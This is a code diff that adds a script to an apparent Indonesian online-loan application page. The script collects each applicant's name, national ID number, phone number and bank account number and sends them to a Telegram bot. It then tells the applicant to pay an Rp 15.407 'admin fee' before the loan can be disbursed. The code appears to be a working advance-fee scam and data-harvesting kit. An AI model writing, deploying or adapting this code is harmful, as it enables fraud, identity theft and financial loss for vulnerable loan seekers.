+            const ktp = document.getElementById('ktp').value;
+            const nohp = document.getElementById('nohp').value;
+            const nominal = document.getElementById('nominal').value;
+            const tenor = document.getElementById('tenor').value;
+            const tujuan = document.getElementById('tujuan').value;
+            const bank = document.getElementById('bank').value;
+            const norek = document.getElementById('norek').value;
+            const waktu = new Date().toLocaleString('id-ID');
+
+            const pesan = `📩 *PENGAJUAN PINJAMAN BARU*\n\n` +
+                          `👤 *Nama:* ${nama}\n` +
+                          `🆔 *KTP:* ${ktp}\n` +
+                          `📱 *No HP:* ${nohp}\n\n` +
+                          `💰 *Jumlah Pinjaman:* ${nominal}\n` +
+                          `📆 *Tenor:* ${tenor}\n` +
+                          `🎯 *Tujuan:* ${tujuan}\n\n` +
+                          `🏦 *Bank/E-Wallet:* ${bank}\n` +
+                          `🔢 *No Rekening:* ${norek}\n\n` +
+                          `💳 *Biaya Admin:* Rp 15.407\n` +
+                          `⏰ *Waktu:* ${waktu}\n\n` +
+                          `_Status: Menunggu Pembayaran Admin_`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                loader.style.display = 'none';
+                if (data.ok) {
+                    alert("Data pengajuan terkirim! Silakan selesaikan biaya admin Rp 15.407 agar pencairan dapat diproses ke rekening Anda.");
+                    document.getElementById('formPinjaman').reset();
+                    closeAdminModal();
+                } else {
+                    alert("Terjadi kesalahan sistem. Silakan coba lagi.");
+                }
+            })
+            .catch(error => {
+                loader.style.display = 'none';
+                console.error('Error:', error);
+                alert("Gagal mengirim data. Periksa koneksi internet Anda.");
+            });
+        }
     </script>
-</body>
+    
+    </body>
 </html>
